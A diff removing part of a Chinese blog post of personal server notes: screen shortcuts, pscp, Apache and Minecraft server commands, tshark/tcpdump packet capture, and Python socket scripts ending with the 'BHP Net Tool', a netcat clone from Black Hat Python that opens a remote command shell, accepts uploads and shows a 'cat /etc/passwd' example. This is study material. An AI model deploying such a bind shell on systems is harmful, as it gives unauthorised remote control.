-<td align="center"><code>ctrl+a     c</code></td>
-<td align="center">在当前终端新建session</td>
-</tr>
-<tr>
-<td align="center"><code>ctrl+a     w</code></td>
-<td align="center">显示当前终端session列表</td>
-</tr>
-<tr>
-<td align="center"><code>ctrl+a     k</code></td>
-<td align="center">关闭当前session</td>
-</tr>
-<tr>
-<td align="center"><code>ctrl+a     0-9</code></td>
-<td align="center">显示0-9session</td>
-</tr>
-<tr>
-<td align="center"><code>ctrl+a     space</code></td>
-<td align="center">按照顺序显示下一个session</td>
-</tr>
-<tr>
-<td align="center"><code>ctrl+a     A</code></td>
-<td align="center">为当前session命名</td>
-</tr>
-</tbody></table>
-<ul>
-<li><code>screen   -D  -r  &lt;name&gt;</code>可解决某些情况下无法重连接终端的问题</li>
-<li>若要关闭某个session，则关闭该session下所有window即可</li>
-</ul>
-<h2 id="使用pscp从本地上传文件"><a href="#使用pscp从本地上传文件" class="headerlink" title="使用pscp从本地上传文件"></a>使用pscp从本地上传文件</h2><blockquote>
-<p>更推荐使用 finalShell 类的工具,非常方便,省去打命令的时间,且更直观</p>
-</blockquote>
-<p>步骤:</p>
-<ol>
-<li>从本地打开<code>CMD</code>到（pscp）putty目录下</li>
-<li>pscp</li>
-<li>基本命令格式：<br><code>pscp   [本地文件路径]   [用户名]@[ServerIP]:[目录]</code><br>或<code>pscp  -r   [本地目录路径]  [用户名]@[ServerIP]：[目录]</code><br>同理，pscp也可以从Linux向Windows复制文件或目录</li>
-</ol>
-<h2 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><h4 id="通用方法"><a href="#通用方法" class="headerlink" title="通用方法:"></a>通用方法:</h4><ul>
-<li>启动:<code>/usr/local/apache2/bin/apachectl start apaceh</code></li>
-<li>停止:<code>/usr/local/apache2/bin/apachectl stop</code></li>
-<li>重启:<code>/usr/local/apache2/bin/apachectl restart</code></li>
-<li>重启但不中断当前连接:<code>/usr/local/sbin/apachectl graceful</code><h4 id="作为Linux的服务时"><a href="#作为Linux的服务时" class="headerlink" title="作为Linux的服务时:"></a>作为Linux的服务时:</h4></li>
-<li>启动: <code>service httpd start 启动</code></li>
-<li>重新启动:<code>service httpd restart</code></li>
-<li>停止:<code>service httpd stop</code><h4 id="Ubuntu系统下"><a href="#Ubuntu系统下" class="headerlink" title="Ubuntu系统下:"></a>Ubuntu系统下:</h4></li>
-<li>启动: <code>$ sudo /etc/init.d/apache2 start</code></li>
-<li>重新启动: <code>$ sudo /etc/init.d/apache2 restart</code></li>
-<li>停止: <code>$ sudo /etc/init.d/apache2 stop</code><h4 id="kali下"><a href="#kali下" class="headerlink" title="kali下:"></a>kali下:</h4></li>
-<li>启动: <code>service apache2 start</code></li>
-<li>启动mysql: <code>servive mysql start</code><h4 id="其它"><a href="#其它" class="headerlink" title="其它:"></a>其它:</h4>在配置完成apache2.conf 文件以达到禁止访问目录的目的后, 我重新启动apache2服务, 但是却显示apache2.conf文件语法错误<blockquote>
-<p>Invalid Mutex directory in argument file:${APACHE_LOCK_DIR}</p>
-</blockquote>
-</li>
-</ul>
-<p>然而这里的部分我没有任何改动.<br>使用如下命令可以避免报错, 直接启动<br><code>sudo apachectl restart</code><br>原理至今不明.</p>
-<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p><code>/etc/apache2/apache2.conf</code></p>
-<h2 id="MineCraft相关命令"><a href="#MineCraft相关命令" class="headerlink" title="MineCraft相关命令"></a>MineCraft相关命令</h2><ul>
-<li><p>mine craft启动命令（其他jar类型的程序应该也可以如此启动）<br><code>java -Xms# -Xmx# -jar [path]/minecraft_server.[version].jar nogui</code><br><code>nogui</code>:表示不以图形界面运行,因为我的服务器是server版的,本身就没有图形界面,所以不加也可以<br><code>-Xms</code>:初始启动分配内存<br><code>-Xmx</code>:最大分配内存<br><code>path</code>:jar包所在路径<br><code>version</code>:当前MineCraft_Server版本</p>
-</li>
-<li><p><code>tell &lt;sb&gt; &lt;something&gt;</code>: 给sb 私信 </p>
-</li>
-<li><p><code>gamemode survival &lt;sb&gt;</code>:将 sb 调至 生存模式</p>
-</li>
-<li><p><code>gamemode create &lt;sb&gt;</code>:将sb 调至 创造模式</p>
-</li>
-</ul>
-<h2 id="tshark-使用"><a href="#tshark-使用" class="headerlink" title="tshark 使用"></a>tshark 使用</h2><p><strong>基本每个命令都需要root权限<code>sudo</code></strong></p>
-<ul>
-<li>显示可用网卡 <code>tshark -D</code></li>
-<li>抓包  使用命令 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tshark  -c [数字]  -w [文件名.pcap] -f [捕获过滤器]</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">+ -c 表示抓多少包后停止</span><br><span class="line">+ -w 把抓包结果输入到文件中, 无需提前创建, 若目录下没有, 自动创建</span><br><span class="line">+ -f 设置捕获过滤器, 我们此处主要针对http的数据包, 所以参数设定为 &quot;port 80&quot;</span><br><span class="line"></span><br><span class="line">但是根据我的试验, 凡是使用tshark后产生的文件权限都十分敏感, 没法用finalshell 直接下载, 为了方便起见, 再补充使用 `tcpdump` 的方法</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p>tcpdump -s  [数字]  -w [文件.pcap] port [端口数]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">+ -s 表示一个包截断的长度, 0表示不截断, 完整的保存下来</span><br><span class="line">+ -w 输入到文件</span><br><span class="line">+ port 监听的端口</span><br><span class="line"></span><br><span class="line">**使用 tcpdump 同样需要sudo**</span><br><span class="line"></span><br><span class="line">## python 脚本</span><br><span class="line"></span><br><span class="line">### TCP客户端</span><br><span class="line">```py</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">target_host = &quot;188.131.227.20&quot;</span><br><span class="line">target_port =  9999   #与服务端保持一致</span><br><span class="line"></span><br><span class="line">#create a object named client</span><br><span class="line">client = socket.socket(socket.AF_INET,  socket.SOCK_STREAM)</span><br><span class="line">#connect server and client</span><br><span class="line">client.connect((target_host,target_port))</span><br><span class="line">#sent data to server</span><br><span class="line">client.send(&quot;hello world&quot;)</span><br><span class="line">#recevice data from server</span><br><span class="line">response = client.recv(4096)</span><br><span class="line"></span><br><span class="line">print response</span><br></pre></td></tr></table></figure>
-
-<h3 id="TCP服务端"><a href="#TCP服务端" class="headerlink" title="TCP服务端"></a>TCP服务端</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">bind_ip = <span class="string">"0.0.0.0"</span></span><br><span class="line">bind_port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">server = socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line">server.bind((bind_ip , bind_port))</span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Listening on %s:%d"</span> % (bind_ip , bind_port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_client</span><span class="params">( client_socket )</span>:</span></span><br><span class="line">    request = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Received: %s"</span> % request</span><br><span class="line">    </span><br><span class="line">    client_socket.send(<span class="string">"ACK!"</span>)</span><br><span class="line">    </span><br><span class="line">    client_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    client , addr = server.accept()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Accepted connection from: %s:%d"</span> % (addr[<span class="number">0</span>] , addr[<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line">    client_handler = threading.Thread(target=handle_client , args=(client, ))</span><br><span class="line">    </span><br><span class="line">    client_handler.start()</span><br></pre></td></tr></table></figure>
-
-<h3 id="仿-netcat-的脚本工具-—-BHP-Net-Tool"><a href="#仿-netcat-的脚本工具-—-BHP-Net-Tool" class="headerlink" title="仿 netcat 的脚本工具 — BHP Net Tool"></a>仿 netcat 的脚本工具 — BHP Net Tool</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">listen                 = <span class="literal">False</span></span><br><span class="line">command                = <span class="literal">False</span></span><br><span class="line">upload                 = <span class="literal">False</span></span><br><span class="line">execute                = <span class="string">""</span></span><br><span class="line">target                 = <span class="string">""</span></span><br><span class="line">upload_destination     = <span class="string">""</span></span><br><span class="line">port                   = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"BHP Net Tool"</span></span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage: BHP_server.py -t target_host -p port"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-l --listen  - listen on [host]:[port] for incoming connections"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-e --execute=file_to_run - execute the given file upon receiving a connection"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-c --command -initialize a command shell"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-u --upolad=destination  - upon receiving connection ypload a file and write to [destination]"</span></span><br><span class="line">    <span class="keyword">print</span> </span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Examples:  "</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"BHP_server.py -t 192.168.0.1 -p 5555 -l -c"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"BHP_server.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"BHP_server.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\" "</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"echo 'ABCDEFGHI' | ./BHP_server.py -t 192.168.11.12 -p 135"</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_sender</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#global target</span></span><br><span class="line">    <span class="comment">#global port      </span></span><br><span class="line">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        client.connect((target, port))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> len(buffer):</span><br><span class="line">            client.send(buffer)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            </span><br><span class="line">            recv_len = <span class="number">1</span></span><br><span class="line">            response = <span class="string">""</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> recv_len:</span><br><span class="line">                data = client.recv(<span class="number">4096</span>)</span><br><span class="line">                recv_len = len(data)</span><br><span class="line">                response += data</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> recv_len &lt; <span class="number">4096</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">            <span class="keyword">print</span> response</span><br><span class="line">            buffer = raw_input(<span class="string">""</span>)</span><br><span class="line">            buffer += <span class="string">"\n"</span></span><br><span class="line">            </span><br><span class="line">            client.send(buffer)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span>   <span class="string">"[*]    Exception! Exiting."</span></span><br><span class="line">        client.close()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span><span class="params">()</span> :</span></span><br><span class="line">    <span class="keyword">global</span> target </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(target) :</span><br><span class="line">        target = <span class="string">"0.0.0.0"</span></span><br><span class="line">    </span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server.bind((target,port))</span><br><span class="line">    </span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span> :</span><br><span class="line">        client_socket, add = server.accept()</span><br><span class="line">        </span><br><span class="line">        client_thread = threading.Thread(target=client_handler, args=(client_socket,))</span><br><span class="line">        client_thread.start()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(command)</span>:</span></span><br><span class="line">    command = command.rstrip()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        output = <span class="string">"Failed to execute command.\r\n"</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_handler</span><span class="params">(client_socket)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> upload</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> len(upload_destination):</span><br><span class="line">        file_buffer = <span class="string">""</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data=client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span> :</span><br><span class="line">                file_buffer += data</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file_descriptor = open(upload_destination,<span class="string">"wb"</span>)</span><br><span class="line">            file_descriptor.write(file_buffer)</span><br><span class="line">            file_descriptor.close()</span><br><span class="line">            </span><br><span class="line">            client_socket.send(<span class="string">"Successfully saved file to %s\r\n"</span>%upload_destination)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span>: </span><br><span class="line">            client_socket.send(<span class="string">"Failed to save file to %s\r\n"</span>%upload_destination)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> len(execute):</span><br><span class="line">        output = run_command(execute)</span><br><span class="line">        client_socket.send(output)</span><br><span class="line">    <span class="keyword">if</span> command:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span> :</span><br><span class="line">            client_socket.send(<span class="string">"&lt;BHP:#&gt; "</span>)</span><br><span class="line">            </span><br><span class="line">            cmd_buffer = <span class="string">""</span></span><br><span class="line">            <span class="keyword">while</span> <span class="string">"\n"</span> <span class="keyword">not</span> <span class="keyword">in</span> cmd_buffer:</span><br><span class="line">                cmd_buffer += client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">            response = run_command(cmd_buffer)</span><br><span class="line">            client_socket.send(response)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">global</span> listen</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    <span class="keyword">global</span> upload_destination</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(sys.argv[<span class="number">1</span>:]):</span><br><span class="line">        usage()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:], <span class="string">"hle:t:p:cu:"</span>, [<span class="string">"help"</span>, <span class="string">"listen"</span>, <span class="string">"execute"</span>, <span class="string">"target"</span>, <span class="string">"port"</span>, <span class="string">"command"</span>, <span class="string">"upload"</span>])</span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">print</span> str(err)</span><br><span class="line">        usage()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> o, a <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">"-h"</span>, <span class="string">"--help"</span>):</span><br><span class="line">            usage()</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-l"</span>, <span class="string">"--listen"</span>):</span><br><span class="line">            listen = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-e"</span>, <span class="string">"--execute"</span>):</span><br><span class="line">            execute = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span>(<span class="string">"-c"</span>, <span class="string">"--command"</span>):</span><br><span class="line">            command = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span>(<span class="string">"-u"</span>, <span class="string">"--upload"</span>):</span><br><span class="line">            upload_destination = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span>(<span class="string">"-t"</span>, <span class="string">"--target"</span>):</span><br><span class="line">            target = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span>(<span class="string">"-p"</span>, <span class="string">"--port"</span>):</span><br><span class="line">            port = int(a)</span><br><span class="line">        <span class="keyword">else</span>:   </span><br><span class="line">            <span class="keyword">assert</span> <span class="literal">False</span>,<span class="string">"Unhandled Option"</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> listen <span class="keyword">and</span> len(target) <span class="keyword">and</span> port &gt; <span class="number">0</span>:</span><br><span class="line">        buffer = sys.stdin.read()</span><br><span class="line">        client_sender(buffer)</span><br><span class="line">    <span class="keyword">if</span> listen:</span><br><span class="line">        server_loop()</span><br><span class="line">    </span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
-      
-        
-        <tags>
-            
-            <tag> python </tag>
-            
-            <tag> 服务器 </tag>
-            
-            <tag> ubuntu </tag>
             
         </tags>
         
